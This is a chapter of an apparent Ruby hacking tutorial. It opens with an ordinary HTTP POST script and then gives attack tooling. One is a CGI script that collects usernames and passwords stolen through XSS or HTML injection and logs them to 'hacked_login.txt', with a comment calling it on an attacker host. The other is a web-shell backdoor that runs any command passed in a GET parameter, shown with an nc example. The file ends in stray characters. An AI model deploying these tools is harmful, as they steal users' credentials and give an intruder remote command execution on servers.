# Chapter 0x5 | Web KungFu

## Send HTTP Post request with custom headers
Here the post body from a file
```ruby
require 'net/http'
require 'uri'


uri = URI.parse "http://example.com/Pages/PostPage.aspx"
headers =
{
   'Referer' => 'http://example.com/Pages/SomePage.aspx',
   'Cookie' => 'TS9e4B=ae79efe; WSS_FullScrende=false; ASP.NET_SessionId=rxuvh3l5dam',
   'Connection' => 'keep-alive',
   'Content-Type' =>'application/x-www-form-urlencoded'
 }
post = File.read post_file   # Raw Post Body's Data
http    = Net::HTTP.new(uri.host, uri.port)
request = Net::HTTP::Post.new(uri.path, headers)
request.body = post
response = http.request request
puts response.code
puts response.body
```

## CGI
### Get info - for XSS/HTMLi exploitation

Add the following to cat /etc/apache2/sites-enabled/[SITE] then restart the service
```
<Directory /var/www/[CGI FOLDER]>
        AddHandler cgi-script .rb
        Options +ExecCGI
</Directory>
```
Now, put the script in /var/www/[CGI FOLDER]. You can use it now.
```ruby
#!/usr/bin/ruby -w
# CGI script gets user/pass | http://attacker/info.rb?user=USER&pass=PASS
require 'cgi'
require 'uri'

cgi  = CGI.new
cgi.header  # content type 'text/html'
user = URI.encode cgi['user']
pass = URI.encode cgi['pass']
time = Time.now.strftime("%D %T")

file = 'hacked_login.txt'
File.open(file, "a") do |f|
  f.puts time
  f.puts "#{URI.decode user}:#{URI.decode pass}"
  f.puts cgi.remote_addr
  f.puts cgi.referer
  f.puts "---------------------------"
end
File.chmod(0200, file)  # To prevent ppl from browsing the log file
```

### Web Shell - command execution via GET

if you have a server that supports ruby CGI, you can use the follwoing as backdoor
```ruby
#!/usr/bin/env ruby
# echo "GET /cgi/shell.rb?cmd=ls%20-la" | nc host 80
require 'cgi'
cgi = CGI.new
puts cgi.header
system(cgi['cmd'])
```





















sssssssssssssssssssssss
